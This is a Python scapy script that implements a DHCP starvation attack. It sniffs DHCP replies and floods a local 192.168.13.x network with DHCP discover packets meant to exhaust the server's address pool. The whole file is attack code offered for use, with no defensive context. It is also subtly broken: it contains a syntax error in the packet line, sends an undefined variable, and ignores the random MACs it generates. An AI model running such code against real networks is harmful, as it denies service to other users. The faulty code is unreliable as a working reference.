from scapy.all import *
from time import sleep
from threading import Thread
import random

class DHCPStarvation(object):
    def __init__(self, iface):
        self.iface = iface

        self.mac = [""]
        self.ips = []
        self.ip = "192.168.13.1"

    def start(self):
        thread = Thread(target=self.listen)
        thread.start()
        self.starve()

    def handle_dhcp(self, pkt):
        if pkt[DHCP]:
            if pkt[DHCP].options[0][1]==5 and pkt[IP].dst != "192.168.13.2":
                self.ips.append(pkt[IP].dst)
            # elif pkt[DHCP].options[0][1]==6:
            #     print("NAK received")
    def listen(self):
        sniff(filter="udp and (port 67 or port 68)",
            prn=self.handle_dhcp,
            store=0)

    def starve(self):
        for i in range(3, 255):
            requested_addr = f"192.168.13.{i}"
            if requested_addr in self.ips:
                continue

            src_mac = ""
            while src_mac in self.mac:
                src_mac = RandMAC()
            self.mac.append(src_mac)


            test = Ether(dst='ff:ff:ff:ff:ff:ff', src='10:4a:7d:53:88:aa', type=2048)
            test /= IP(version=4, ihl=5, tos=192, len=319, id=0, flags=2, frag=0, ttl=64, proto=17, src='0.0.0.0', dst='255.255.255.255')
            test /= UDP(sport=68, dport=67, len=299)/BOOTP(op=BOOTREQUEST, htype=1, hlen=6, hops=0, xid=2416760280, secs=1, flags=0, ciaddr=0.0.0.0, yiaddr=0.0.0.0, siaddr=0.0.0.0, giaddr=0.0.0.0, chaddr=b'\x10J}S\x88\xbb\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00', sname=b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00', file=b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00', options='c\x82Sc')/DHCP(options=[('message-type', 1), ('client_id', b'\x01\x10J}S\x88\xaa'), ('param_req_list', [1, 2, 6, 12, 15, 26, 28, 121, 3, 33, 40, 41, 42, 119, 249, 252, 17]), ('max_dhcp_size', 576), ('hostname', b'ThinkPad-W541'), 'end'])

            sendp(pkt, self.iface)


if __name__ == "__main__":
    starvation = DHCPStarvation("wlp3s0")
    starvation.start()